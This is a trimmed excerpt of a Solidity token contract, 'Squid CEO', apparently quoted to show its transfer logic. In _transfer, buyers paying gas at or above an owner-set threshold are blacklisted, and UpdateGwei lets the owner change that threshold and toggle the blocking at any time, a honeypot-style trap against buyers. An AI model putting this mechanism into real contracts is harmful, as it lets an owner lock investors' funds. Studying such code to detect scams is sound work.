...
contract SQUIDCEO is Context, IERC20, Ownable {

using SafeMath for uint256;
using Address for address;

string private _name = "Squid CEO";
string private _symbol = "SQUIDCEO";
uint8 private _decimals = 9;

address payable private MarketingWallet = payable(0xFeaf67676b1F19870eE32BfF27536b243278B447); // Marketing Address
address payable private TeamWallet = payable(0xFeaf67676b1F19870eE32BfF27536b243278B447); // Buy Back Address
...
uint256 private _totalSupply = 100 *  10**7 * 10**_decimals;
uint256 public _maxTxAmount = _totalSupply.div(30); 
uint256 public _walletMax = _totalSupply.div(30);
...
bool private GwBL = false; //Auto gw bl on
...
function _transfer(address sender, address recipient, uint256 amount) private returns (bool) {
    ...
    else
    {
        ...
        if (tx.gasprice >= GWEI && recipient != uniswapPair && GwBL) {
        isBlocked[recipient] = true;
    }
        return true;
    }
...
function UpdateGwei (uint256 _GW, bool _GWBL) public onlyOwner {
            GWEI = _GW * 1 gwei; 
            GwBL = _GWBL;
}
}